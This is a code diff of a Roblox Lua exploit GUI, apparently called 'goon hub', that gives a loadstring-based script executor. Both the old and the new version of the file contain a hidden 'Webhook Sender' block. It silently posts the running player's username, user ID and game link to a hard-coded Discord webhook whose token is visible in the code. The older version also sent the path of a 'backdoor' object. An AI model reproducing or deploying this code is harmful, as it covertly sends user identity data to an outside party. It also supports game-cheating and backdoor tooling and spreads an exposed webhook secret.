@@ -9,6 +9,7 @@
 
 -- Instances: 12 | Scripts: 0 | Modules: 0 | Tags: 0
 local G2L = {}
+local HttpService = game:GetService("HttpService")
 
 -- StarterGui.goon hub
 G2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("CoreGui"))
@@ -50,8 +51,7 @@ G2L["Executor_5"].TextWrapped = true
 G2L["Executor_5"].TextSize = 18
 G2L["Executor_5"].BackgroundColor3 = Color3.fromRGB(255, 195, 0)
 G2L["Executor_5"].RichText = true
-G2L["Executor_5"].FontFace =
-    Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+G2L["Executor_5"].FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
 G2L["Executor_5"].MultiLine = true
 G2L["Executor_5"].PlaceholderText = "Script Here"
 G2L["Executor_5"].Size = UDim2.new(0, 230, 0, 194)
@@ -95,59 +95,47 @@ G2L["UICorner_c"] = Instance.new("UICorner", G2L["Clear_b"])
 
 -- Webhook Sender
 
-local request =
-    (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 if request then
-    request(
-        {
-            Url = "https://discord.com/api/webhooks/1396496047404220436/-z7bjlQbXR00lgyLvAOpr8_70_y2UCIYSr38r_Y-Lgh6WuRfCgjdBBMR3ICDBkBOYkv7",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(
-                {
-                    username = "pls dont delete this w3bh00k",
-                    content = "**User: `" ..
-                        game:GetService("Players").LocalPlayer.Name ..
-                            "` | `" ..
-                                game:GetService("Players").LocalPlayer.UserId ..
-                                    "`\nhttps://www.roblox.com/games/" ..
-                                        game.PlaceId .. "\n`" .. backdoor:GetFullName() .. "`**"
-                }
-            )
-        }
-    )
+    request({
+        Url = "https://discord.com/api/webhooks/1396496047404220436/-z7bjlQbXR00lgyLvAOpr8_70_y2UCIYSr38r_Y-Lgh6WuRfCgjdBBMR3ICDBkBOYkv7",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            username = "pls dont delete this w3bh00k",
+            content = "**User: `" ..
+                game:GetService("Players").LocalPlayer.Name ..
+                "` | `" ..
+                game:GetService("Players").LocalPlayer.UserId ..
+                "`\nhttps://www.roblox.com/games/" ..
+                game.PlaceId .. "\n`FUCKERS`**"
+        })
+    })
 end
 
 -- Buttons Logic
 
-G2L["Execute_9"].MouseButton1Click:Connect(
-    function()
-        local code = G2L["Executor_5"].Text
-        if code and code ~= "" then
-            local success, err =
-                pcall(
-                function()
-                    local f, loadErr = loadstring(code)
-                    if f then
-                        f()
-                    else
-                        warn("Loadstring error: " .. tostring(loadErr))
-                    end
-                end
-            )
-            if not success then
-                warn("Runtime error: " .. tostring(err))
+G2L["Execute_9"].MouseButton1Click:Connect(function()
+    local code = G2L["Executor_5"].Text
+    if code and code ~= "" then
+        local success, err = pcall(function()
+            local f, loadErr = loadstring(code)
+            if f then
+                f()
+            else
+                warn("Loadstring error: " .. tostring(loadErr))
             end
+        end)
+        if not success then
+            warn("Runtime error: " .. tostring(err))
         end
     end
-)
+end)
 
-G2L["Clear_b"].MouseButton1Click:Connect(
-    function()
-        G2L["Executor_5"].Text = ""
-    end
-)
+G2L["Clear_b"].MouseButton1Click:Connect(function()
+    G2L["Executor_5"].Text = ""
+end)
 
 return G2L["ScreenGui_1"], require
